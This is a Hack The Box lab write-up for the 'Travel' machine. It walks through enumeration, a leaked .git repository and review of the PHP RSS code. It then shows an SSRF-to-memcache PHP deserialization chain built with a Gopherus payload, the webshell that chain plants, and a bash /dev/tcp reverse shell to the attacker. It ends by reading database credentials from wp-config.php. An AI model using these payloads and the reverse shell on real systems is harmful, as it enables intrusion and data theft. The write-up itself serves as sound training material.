---
layout: menu
title: "HTB Travel"
description: "10.10.10.189 | 40 pts"
header-img: "boxes/screenshots/62_travel/travel.png"
tags: [hackthebox, htb, boot2root, writeup, write-up, linux, SimplePie, RSS, code-review, code review, SSRF, server-side resource forgery, server side resource forgery, PHP deserialization, sql, sql backup, ldap, ldif, ldapsearch, ldapmodify, travel, travel.htb]
---

# <span style="color:red">HTB Travel (10.10.10.189)</span>

---

## PART 1 :  INITIAL ENUMERATION

### 1.1 nmap

```shell
$ nmap --min-rate 3000 -oN nmap-tcp.initial -p- -v 10.10.10.189

  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  443/tcp open  https
  
$ nmap -oN nmap-tcp -p 22,80,443 -sC -sV -v 10.10.10.189

  PORT    STATE SERVICE  VERSION
  22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 d3:9f:31:95:7e:5e:11:45:a2:b4:b6:34:c0:2d:2d:bc (RSA)
  |   256 ef:3f:44:21:46:8d:eb:6c:39:9c:78:4f:50:b3:f3:6b (ECDSA)
  |_  256 3a:01:bc:f8:57:f5:27:a1:68:1d:6a:3d:4e:bc:21:1b (ED25519)
  80/tcp  open  http     nginx 1.17.6
  | http-methods: 
  |_  Supported Methods: GET HEAD
  |_http-server-header: nginx/1.17.6
  |_http-title: Travel.HTB
  443/tcp open  ssl/http nginx 1.17.6
  | http-methods: 
  |_  Supported Methods: GET HEAD
  |_http-server-header: nginx/1.17.6
  |_http-title: Travel.HTB - SSL coming soon.
  | ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
  | Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
  | Issuer: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
  | Public Key type: rsa
  | Public Key bits: 2048
  | Signature Algorithm: sha256WithRSAEncryption
  | Not valid before: 2020-04-23T19:24:29
  | Not valid after:  2030-04-21T19:24:29
  | MD5:   ef0a a4c1 fbad 1ac4 d160 58e3 beac 9698
  |_SHA-1: 0170 7c30 db3e 2a93 cda7 7bbe 8a8b 7777 5bcd 0498
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Various subdomains were found -- `www.travel.htb`, `blog.travel.htb`, `blog-dev.travel.htb`.
- UDP scan using `nmap`, doesn't yield any result.

---

## PART 2 : PORT ENUMERATION

### 2.1 TCP PORT 80 : HTTP

#### 2.1.1 http[://]travel.htb

![80_travel](./screenshots/62_travel/80_travel.png)

#### 2.1.2 http[://]blog.travel.htb

![80_blog](./screenshots/62_travel/80_blog.png)
This subdomain is hosting a WordPress application. Using `wpscan` to enumerate the service:

```shell
$ wpscan --update

$ wpscan --output 80_wpscan_blog.txt --url http://blog.travel.htb

  [+] Headers
   | Interesting Entries:
   |  - Server: nginx/1.17.6
   |  - X-Powered-By: PHP/7.3.16
   | Found By: Headers (Passive Detection)
   | Confidence: 100%

  [+] robots.txt found: http://blog.travel.htb/robots.txt
   | Interesting Entries:
   |  - /wp-admin/
   |  - /wp-admin/admin-ajax.php
   | Found By: Robots Txt (Aggressive Detection)
   | Confidence: 100%

  [+] XML-RPC seems to be enabled: http://blog.travel.htb/xmlrpc.php
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 100%
   | References:
   |  - http://codex.wordpress.org/XML-RPC_Pingback_API
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
   |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

  [+] WordPress readme found: http://blog.travel.htb/readme.html
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 100%

  [+] The external WP-Cron seems to be enabled: http://blog.travel.htb/wp-cron.php
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 60%
   | References:
   |  - https://www.iplocation.net/defend-wordpress-from-ddos
   |  - https://github.com/wpscanteam/wpscan/issues/1299

  [+] WordPress version 5.4 identified (Insecure, released on 2020-03-31).
   | Found By: Rss Generator (Passive Detection)
   |  - http://blog.travel.htb/feed/, <generator>https://wordpress.org/?v=5.4</generator>
   |  - http://blog.travel.htb/comments/feed/, <generator>https://wordpress.org/?v=5.4</generator>

  [+] WordPress theme in use: twentytwenty
   | Location: http://blog.travel.htb/wp-content/themes/twentytwenty/
   | Last Updated: 2021-03-09T00:00:00.000Z
   | Readme: http://blog.travel.htb/wp-content/themes/twentytwenty/readme.txt
   | [!] The version is out of date, the latest version is 1.7
   | Style URL: http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver=1.2
   | Style Name: Twenty Twenty
   | Style URI: https://wordpress.org/themes/twentytwenty/
   | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
   | Author: the WordPress team
   | Author URI: https://wordpress.org/
   |
   | Found By: Css Style In Homepage (Passive Detection)
   | Confirmed By: Css Style In 404 Page (Passive Detection)
   |
   | Version: 1.2 (80% confidence)
   | Found By: Style (Passive Detection)
   |  - http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

  [i] No plugins Found.
  [i] No Config Backups Found.
```

#### 2.1.3 http[://]blog-dev.travel.htb

![80_blog-dev](./screenshots/62_travel/80_blog-dev.png)

The landing page returns forbidden and doing more enumeration using `nmap` returns:

```shell
$ sudo nmap -p 80 --script safe,vuln -Pn blog-dev.travel.htb
  
  PORT   STATE SERVICE
  80/tcp open  http
  [...omitted...]
  | http-enum: 
  |_  /.git/HEAD: Git folder
  |_http-fetch: Please enter the complete path of the directory to save data in.
  | http-git: 
  |   10.10.10.189:80/.git/
  |     Git repository found!
  |     Repository description: Unnamed repository; edit this file 'description' to name the...
  |_    Last commit message: moved to git 
  | http-headers: 
  |   Server: nginx/1.17.6
  [...omitted...]
  |   
  |_  (Request type: GET)
  [...omitted...]
```

A `/.git` directory was found but navigating to it also returns a __403 Response__ (Forbidden). Attempting to use `gobuster` to see if responses other than __403__ could be seen:

```shell
$ gobuster dir -o 80_gobuster_blog-dev_git.txt --timeout 5s -u http://blog-dev.travel.htb/.git -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 

  /index                (Status: 200) [Size: 297]
  /info                 (Status: 301) [Size: 170] [--> http://blog-dev.travel.htb/.git/info/]
  /config               (Status: 200) [Size: 92]                                             
  /logs                 (Status: 301) [Size: 170] [--> http://blog-dev.travel.htb/.git/logs/]
  /objects              (Status: 301) [Size: 170] [--> http://blog-dev.travel.htb/.git/objects/]
  /description          (Status: 200) [Size: 73]                                                
  /branches             (Status: 301) [Size: 170] [--> http://blog-dev.travel.htb/.git/branches/]
  [...omitted...]
```

Since only the root seems to be unreadable, maybe we could extract the git files using [__git-dumper.py__](https://github.com/arthaud/git-dumper)

```shell
$ mkdir 80_git_blog-dev

$ ./git-dumper/git_dumper.py http://blog-dev.travel.htb ./80_git_blog-dev

  [-] Testing http://blog-dev.travel.htb/.git/HEAD [200]
  [-] Testing http://blog-dev.travel.htb/.git/ [403]
  [-] Fetching common files
  [...omitted...]
  
$ ls -a ./80_git_blog-dev

  .git  README.md  rss_template.php  template.php
  
$ ls -a ./80_git_blog-dev/.git

  COMMIT_EDITMSG  config  description  HEAD  hooks  index  info  logs  objects  refs

$ cat ./80_git_blog-dev/.git/logs/HEAD 

  0000000000000000000000000000000000000000 0313850ae948d71767aff2cc8cc0f87a0feeef63 jane <jane@travel.htb> 1587458094 -0700	commit (initial): moved to git

$ cat ./80_git_blog-dev/README.md

  # Rss Template Extension

  Allows rss-feeds to be shown on a custom wordpress page.

  ## Setup

  * `git clone https://github.com/WordPress/WordPress.git`
  * copy rss_template.php & template.php to `wp-content/themes/twentytwenty` 
  * create logs directory in `wp-content/themes/twentytwenty` 
  * create page in backend and choose rss_template.php as theme

  ## Changelog

  - temporarily disabled cache compression
  - added additional security checks 
  - added caching
  - added rss template

  ## ToDo

  - finish logging implementation 
```

The contents of the `.git` folder seems to pertain to the deployment of and RSS feed for other services. A user, __jane__ (jane@travel.htb), was also found to have been responsible for the creation of the repository. And based on the output of `wpscan` from __http[://]blog.travel.htb__, the RSS service may have been deployed to it as well.

### 2.2 TCP PORT 443 : HTTPS

![443_travel](./screenshots/62_travel/443_travel.jpg)

All subdomains, when accessed via HTTPS, returns an under construction page with the following message:

```
We are currently sorting out how to get SSL 
implemented with multiple domains properly. Also we 
are experiencing severe performance problems on SSL 
still.

In the meantime please use our non-SSL websites.

Thanks for your understanding,
admin 
```

---

## PART 3 : EXPLOITATION

### 3.1 The RSS Feed

#### 3.1.1 RSS in blog.travel.htb:

Looking back at the output of `wpscan`:

```console
[+] WordPress version 5.4 identified (Insecure, released on 2020-03-31).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.travel.htb/feed/, <generator>https://wordpress.org/?v=5.4</generator>
 |  - http://blog.travel.htb/comments/feed/, <generator>https://wordpress.org/?v=5.4</generator>
```

As well as the landing page of http[://]blog.travel.htb, there is a link to __Awesome RSS__ in the navigation bar:

![80_blog_rss](./screenshots/62_travel/80_blog_rss.png)

This brings you to __http[://]blog.travel.htb/awesome-rss__:

![80_blog_awesome-rss](./screenshots/62_travel/80_blog_awesome-rss.png)


#### 3.1.3 Review of __rss_template.php__:

This was extracted from the contents of http[://]blog-dev.travel.htb/.git/

```php
<?php
	/*
	Template Name: Awesome RSS
	*/
	include('template.php');
	get_header();
?>
[...omitted...]
<?php
	function get_feed($url){
    	require_once ABSPATH . '/wp-includes/class-simplepie.php';	    
    	$simplepie = null;	  
     	$data = url_get_contents($url);
     	if ($url) {
         	$simplepie = new SimplePie();
         	$simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
         	//$simplepie->set_raw_data($data);
         	$simplepie->set_feed_url($url);
         	$simplepie->init();
         	$simplepie->handle_content_type();
         	if ($simplepie->error) {
            	error_log($simplepie->error);
             	$simplepie = null;
             	$failed = True;
         	}
     	} else {
         	$failed = True;
     	}
     	return $simplepie;
	}

 	$url = $_SERVER['QUERY_STRING'];
	if(strpos($url, "custom_feed_url") !== false){
		$tmp = (explode("=", $url)); 	
		$url = end($tmp); 	
 	} else {
 	 	$url = "http://www.travel.htb/newsfeed/customfeed.xml";
 	}
 	$feed = get_feed($url); 
    if ($feed->error()) {
		echo '<div class="sp_errors">' . "\r\n";
		echo '<p>' . htmlspecialchars($feed->error()) . "</p>\r\n";
		echo '</div>' . "\r\n";
	}
	else {
?>
[...omitted...]
<!--
DEBUG
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
-->
[...omitted...]
```

There us a function `get_feed($url)` that is using [SimplePie](https://simplepie.org/) for the RSS and __*memcache*__ for caching data. The argument that will be fed to the function is probably passed through __GET parameters__ (*custom_feed_url*) in __http[://]blog.travel.htb/awesome-rss__ and if none are supplied, will default to `http://www.travel.htb/newsfeed/customfeed.xml`:

![80_www_customfeed](./screenshots/62_travel/80_www_customfeed.PNG)

Which has the same contents listed in __http[://]blog.travel.htb/awesome-rss__ only in XML format. 

Aside from the __`get_feed($url)`__ function there seems to be a debug page as well -- __debug.php__ which could be requested by adding a GET parameter, __`?debug`__. It will still request the usual page but will include debug statements enclosed in HTML comments:

```shell
$ curl -G -d "debug" http://blog.travel.htb/awesome-rss/

  [...omitted...]
  <!--
  DEBUG
   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
  -->
  [...omitted...]
```

### 3.2 Checking for RFI in get_feed()

1. Create a __customfeed.xml__ file based on __`http://www.travel.htb/newsfeed/customfeed.xml`__:

   ```xml
   <rss version="2.0">
   	<channel>
   		<item>
   			<title>
   				Jebidiah was here
   			</title>
   			<link>http://10.10.14.6/something</link>
   			<guid>http://10.10.14.6/something</guid>
   			<pubDate>Mon, 30 Sep 2019 08:20:05 -0500</pubDate>
   			<description>
   				This is a test.
   			</description>
   		</item>
   	</channel>
   </rss>
   ```

2. Start a Python HTTP Server:

   ```shell
   $ sudo python -m SimpleHTTPServer 80
   ```

3. Requesting __/awesome-rss/__ with a __*custom_feed_url*__ and __*debug*__ parameter:

   ```shell
   $ curl -G -d "debug=1&custom_feed_url=http://10.10.14.6/customfeed.xml" http://blog.travel.htb/awesome-rss/
   
     [...omitted...]
     <!--
     DEBUG
      ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
     | xct_54bddbaec1(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
      ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
     -->
     [...omitted...]
   ```

4. Looking back at started HTTP server:

   ```console
   10.10.10.189 - - [xx/xxx/xxxx xx:xx:xx] "GET /customfeed.xml HTTP/1.1" 200 -
   10.10.10.189 - - [xx/xxx/xxxx xx:xx:xx] "GET /customfeed.xml HTTP/1.1" 200 -
   ```

The request to the local HTTP Server went through and it seems like a PHP serialized object was logged into memcache as indicated by the __`xct_`__ prefix.

### 3.3 Interaction with memcache

#### 3.3.1 How data is saved to memcache

Based on the [__class-simplepie.php__](https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php) which is included in __rss_template.php__ extracted from the [WordPress Github Page]():

```php
[...omitted...]
if ($this->feed_url !== null)
{
	$parsed_feed_url = $this->registry->call('Misc', 'parse_url', array($this->feed_url));

	// Decide whether to enable caching
	if ($this->cache && $parsed_feed_url['scheme'] !== '')
	{
		$url = $this->feed_url . ($this->force_feed ? '#force_feed' : '');
		$cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $url), 'spc'));
	}

	// Fetch the data via SimplePie_File into $this->raw_data
	if (($fetched = $this->fetch_data($cache)) === true)
	{
		return true;
	}
	elseif ($fetched === false) {
		return false;
	}

	list($headers, $sniffed) = $fetched;
}
[...omitted...]
public $cache_name_function = 'md5';
[...omitted...]
public function set_cache_name_function($function = 'md5')
{
	if (is_callable($function))
	{
		$this->cache_name_function = $function;
	}
}
[...omitted...]
```

When the __`feed_url`__ parameter is not __`null`__, a __`call()`__ function from the __`registry`__ property will be made to a __`get_handler()`__ function in [__Cache.php__](https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache.php) and in this case the value of __`$this->cache_location`__ has been set to __`memcache://127.0.0.1:11211/?timeout=60&prefix=xct_`__ and __`$url`__ will be hashed using __MD5__ based on __`call_user_func($this->cache_name_function, $url)`__:

```php
[...omitted...]
protected static $handlers = array(
	'mysql'     => 'SimplePie_Cache_MySQL',
	'memcache'  => 'SimplePie_Cache_Memcache',
	'memcached' => 'SimplePie_Cache_Memcached',
	'redis'     => 'SimplePie_Cache_Redis'
);
[...omitted...]
public static function get_handler($location, $filename, $extension)
{
	$type = explode(':', $location, 2);
	$type = $type[0];
	if (!empty(self::$handlers[$type]))
	{
		$class = self::$handlers[$type];
		return new $class($location, $filename, $extension);
	}

    return new SimplePie_Cache_File($location, $filename, $extension);
}
[...omitted...]
```

What will happen is that the substring, __`memcache`__, will be extracted from the passed location (`memcache://127.0.0.1...`)  which will return __`SimplePie_Cache_Memcache`__ based on the array of handlers defined. After which a newly initialized class of the same name will be returned.

```php
public function __construct($location, $name, $type)
{
	$this->options = array(
		'host' => '127.0.0.1',
		'port' => 11211,
		'extras' => array(
			'timeout' => 3600, // one hour
			'prefix' => 'simplepie_',
		),
	);
	$this->options = SimplePie_Misc::array_merge_recursive($this->options, SimplePie_Cache::parse_URL($location));

	$this->name = $this->options['extras']['prefix'] . md5("$name:$type");

	$this->cache = new Memcache();
	$this->cache->addServer($this->options['host'], (int) $this->options['port']);
}
```

The constructor function taken from the __`SimplePie_Cache_Memcache`__ class definition [__Memcache.php__](https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcache.php) takes the same parameters from the ones passed to __`get_handler()`__ from __Cache.php__. The values from __`$this->options`__ will be changed since some values were set in the __`$location`__ variable (__`?timeout=60&prefix=xct_`__) so in this case, the prefix that will be used is __`xct_`__ instead of __`simplepie`__. Afterwhich, the value of __`$name`__ will be appended to the prefix.

```php
public function save($data)
{
	if ($data instanceof SimplePie)
	{
		$data = $data->data;
	}
	return $this->cache->set($this->name, serialize($data), MEMCACHE_COMPRESSED, (int) $this->options['extras']['timeout']);
}
```

The data provided (contents of __`$url`__) will then be serialized and saved into the cache.

To summarize specific to this scenario:

1. The caching begins by taking three parameters that will be passed to the __`get_handler()`__ function in __Cache.php__ -- __`memcache://127.0.0.1:11211/?timeout=60&prefix=xct_`__, __`fe1fb813519a90aa175e3f3d721a07ca`__ (MD5 value of __`http://10.10.14.6/customfeed.xml`__), and `spc`
2. The __`get_handler()`__ function will then determine what method of caching is needed based on the first parameter given; in this case, __memcache__ so the class definition of __`SimplePie_Cache_Memcache`__ will be used. The name of the data that will be written in the cache will follow the format --__`xct_`__ plus the value of __`md5("fe1fb813519a90aa175e3f3d721a07ca:spc")`__
3. A serialized version of the data will then be saved in to the cached catalogued with the prefix plus the newly generated md5.

#### 3.3.2 Review of debug.php

The output for __debug.php__ last time when __`http://10.10.14.6/customfeed.xml`__ was requested was:

```console
   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
  | xct_54bddbaec1(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
```

Following the process explained earlier, the marker generated (__`xct_54bddbaec1(...)`__) should be the same as __`md5(md5("http://10.10.14.6/customfeed.xml").":spc");`__ which is actually the case -- __54bddbaec1543acec82c7141efde0625__

### 3.4 Input Sanitation with template.php

#### 3.4.1 Review of template.php

This file was also extracted from the contents of http[://]blog-dev.travel.htb/.git/ and it seems to be responsible for validating user input supplied in the __*url*__ parameter when requesting __/awesome-rss/__:

```php
<?php

/**
 Todo: finish logging implementation via TemplateHelper
*/

function safe($url)
{
	// this should be secure
	$tmpUrl = urldecode($url);
	if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
	{		
		die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
	}
	if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
	{		
		die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
	}
	$tmp = parse_url($url, PHP_URL_HOST);
	// preventing all localhost access
	if($tmp == "localhost" or $tmp == "127.0.0.1")
	{		
		die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");		
	}
	return $url;
}

function url_get_contents ($url) {
    $url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl ".$url;
	$output = shell_exec($pl);
    return $output;
}
```

The __`safe($url)`__ defined prevents *Local File Inclusion (LFI)* using __`file://`__ and *Server-Side Request Forgery (SSRF)* by filtering requests made via __localhost__. Meanwhile, even though there is a __`shell_exec()`__ function in __`url_get_contents()`__, *Command Injection* is avoided by first passing through the __`safe()`__ function to avoid polluting the __`curl`__ command and then passing the __*url*__ parameter through `escapeshellarg()` to avoid injection using __`/$(<command>)`__ or appending new commands after a semi-colon (__`;<command>`__) to name a few examples.

```php
class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {    	
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}
```

Also inside __template.php__ is a defined class, __`TemplateHelper`__. There are two initialized object properties defined in the class, __*file*__ and __*data*__, based on the class constructor. The __`__wakeup()`__ function is executed during deserialization. In this case, the defined function, __`init()`__ will be executed when __`__wakeup()`__ is triggered. __`init()`__ will write to __`__DIR__.'/logs'`__ with the filename defined in __`$file`__ and contents defined in __`$data`__.

#### 3.4.2 The location of `__DIR__`.'/logs'

Earlier when the contents of __http[://]blog-dev.travel.htb/.git__ were extracted, the __README.md__ file stated that __rss_template.php__ and __template.php__ were saved to __`wp-content/themes/twentytwenty`__:

```console
  ## Setup

  * `git clone https://github.com/WordPress/WordPress.git`
  * copy rss_template.php & template.php to `wp-content/themes/twentytwenty` 
  * create logs directory in `wp-content/themes/twentytwenty` 
  * create page in backend and choose rss_template.php as theme
```

Proving that __`./logs`__ is in the same directory:

```shell
$ curl -I http://blog.travel.htb/wp-content/themes/twentytwenty/logs/

  HTTP/1.1 403 Forbidden
  Server: nginx/1.17.6
  Date: Sun, 04 Apr 2021 16:13:30 GMT
  Content-Type: text/html; charset=iso-8859-1
  Connection: keep-alive
```

### 3.5 Exploiting the RSS Feed via SSRF

The __memcache__ service is running via localhost and based on __template.php__, the sanitation of user input is limited to blacklisting "__localhost__" and "__127.0.0.1__" which could easily be bypassed:

#### 3.5.1 Leverage the TemplateHelper class

Serialized objects are passed through __`memcache`__ so we will use the __`TemplateHelper`__ to write a file into the server.

```php
<?php
class TemplateHelper
{

    public $file;
    public $data;

    public function __construct(string $file, string $data)
    {
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {    	
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}

$afw = new TemplateHelper("jebidiah.php", '<?php echo shell_exec($_GET["cmd"]); ?>');

echo serialize($afw);
?>
```

The initialized variables, __`$file`__ and __`$data`__, were changed from being defined as __`private`__ to __`public`__ since the serialized data will be interpreted from outside the definition of the __`TemplateHelper`__ class.

```shell
$ php serialize.php

  [...omitted...]
  O:14:"TemplateHelper":2:{s:4:"file";s:12:"jebidiah.php";s:4:"data";s:39:"<?php echo shell_exec($_GET["cmd"]); ?>";}
```

#### 3.5.2 Using Gopherus to Generate Payload:

This is a tool that helps to abuse SSRF vulnerabilities and achieve *Remote Code Execution* (RCE).

```shell
$ gopherus --exploit phpmemcache

  Give serialization payload
  example: O:5:"Hello":0:{}   : O:14:"TemplateHelper":2:{s:20:"TemplateHelperfile";s:12:"jebidiah.php";s:20:"TemplateHelperdata";s:39:"<?php echo shell_exec($_GET["cmd"]); ?>";}

  Your gopher link is ready to do SSRF :
  
  gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a

```

#### 3.5.3 Bypassing the security check in template.php

```php
if($tmp == "localhost" or $tmp == "127.0.0.1")
{		
	die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");	
}
```

The only checks are only if the URL is requested via "__localhost__" and "__127.0.0.1__". This could easily bypassed by using __`2130706433`__ (decimal value for 127.0.0.1), using __`0.0.0.0`__, or using __`0`__. The payload will be changed to:

```console
gopher://0.0.0.0:11211/_%0d%0aset%20SpyD3r%204%200%20145%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22TemplateHelperfile%22%3Bs:12:%22jebidiah.php%22%3Bs:20:%22TemplateHelperdata%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
```

#### 3.5.4 Writing the gopher payload to cache

```console
$ curl -G -d "custom_feed_url=gopher://0.0.0.0:11211/_%0d%0aset%20SpyD3r%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a" http://blog.travel.htb/awesome-rss/

$ curl -G -d "debug=1" http://blog.travel.htb/awesome-rss/
  [...omitted...]
  <!--
  DEBUG
   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
  | SpyD3r | O:14:"TemplateHelper":2:{s:20:"Tem(...) |
   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
  -->
  [...omitted...]
```

The serialized payload from earlier was successfully written to the cache.

#### 3.5.5 How data is loaded from the cache

Based on [__Memcache.php__](https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcache.php)

```php
public function load()
{
	$data = $this->cache->get($this->name);

    if ($data !== false)
	{
		return unserialize($data);
	}
	return false;
}
```

A check for a valid name(__xct_\<md5\>__) is performed so it might be necessary for the data to be deserialized. The earlier execution was written as __`SpyD3r`__ (Gopherus default) payload will be changed to:

```console
gopher://0.0.0.0:11211/_%0d%0aset%20xct_54bddbaec1543acec82c7141efde0625%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
```

#### 3.5.6 Deserializing the right way

```console
$ curl -G -d "custom_feed_url=gopher://0.0.0.0:11211/_%0d%0aset%20xct_54bddbaec1543acec82c7141efde0625%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a" --silent http://blog.travel.htb/awesome-rss/ >/dev/null

$ curl -G -d "debug=1" http://blog.travel.htb/awesome-rss/
  [...omitted...]
  <!--
  DEBUG
   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
  | xct_54bddbaec1(...) | O:14:"TemplateHelper":2:{s:20:"Tem(...) |
   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
  -->
  [...omitted...]
  
$ curl -G -d "debug=1&custom_feed_url=http://10.10.14.6/customfeed.xml" --silent http://blog.travel.htb/awesome-rss/ | grep xct
```

The last __`curl`__ command was added to trigger the cached request to __`xct_54bddbaec1543acec82c7141efde0625`__ but this time, the serialized content was from the __gopherus__ payload.

#### 3.5.7 The Uploaded Webshell

Checking if the webshell was uploaded into the server:

```shell
$ curl -I http://blog.travel.htb/wp-content/themes/twentytwenty/logs/jebidiah.php

  HTTP/1.1 200 OK
  Server: nginx/1.17.6
  Date: Sun, 04 Apr 2021 17:11:09 GMT
  Content-Type: text/html; charset=UTF-8
  Connection: keep-alive
  X-Powered-By: PHP/7.3.16
```

Commands could now be executed in the server:

```shell
$ curl -G -d "cmd=id" http://blog.travel.htb/wp-content/themes/twentytwenty/logs/jebidiah.php

  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## PART 4 : PIVOT TO ANOTHER USER (www-data -> lynik-admin)

Setup a __netcat__ listener for the reverse shell:

```shell
$ sudo nc -lvp 443
```

Execute the reverse shell using the uploaded webshell:

```shell
$ curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'" http://blog.travel.htb/wp-content/themes/twentytwenty/logs/jebidiah.php
```

### 4.1 Machine Enumeration

#### 4.1.1 Host Information

```shell
www-data@blog:/var/www/html$ hostname

  blog

www-data@blog:/var/www/html$ cat /etc/passwd | grep -E "sh$"

  root:x:0:0:root:/root:/bin/bash
  
www-data@blog:/var/www/html$ ls -la / | grep docker

  -rwxr-xr-x   1 root root    0 Apr 23  2020 .dockerenv
```

No other users are in the system and upon further checking, it seems like the current shell is inside a docker container.

#### 4.1.2 Database Information

```shell
www-data@blog:/var/www/html$ cat wp-config.php

  // ** MySQL settings - You can get this info from your web host ** //
  /** The name of the database for WordPress */
  define( 'DB_NAME', 'wp' );

  /** MySQL database username */
  define( 'DB_USER', 'wp' );

  /** MySQL database password */
  define( 'DB_PASSWORD', 'fiFtDDV9LYe8Ti' );

  /** MySQL hostname */
  define( 'DB_HOST', '127.0.0.1' );

  /** Database Charset to use in creating database tables. */
  define( 'DB_CHARSET', 'utf8mb4' );

  /** The Database Collate type. Don't change this if in doubt. */
  define( 'DB_COLLATE', '' );
  
www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti -e "SHOW DATABASES;"

  Database
  information_schema
  mysql
  performance_schema
  wp

www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti -e "USE wp; SHOW TABLES;"
  
  Tables_in_wp
  [...omitted...]
  wp_users

www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti -e "SELECT user_login,user_pass,user_nicename,user_email,display_name FROM wp.wp_users;"
```
user_login | user_pass | user_nicename | user_email | display_name
--- | --- | --- | --- | ---
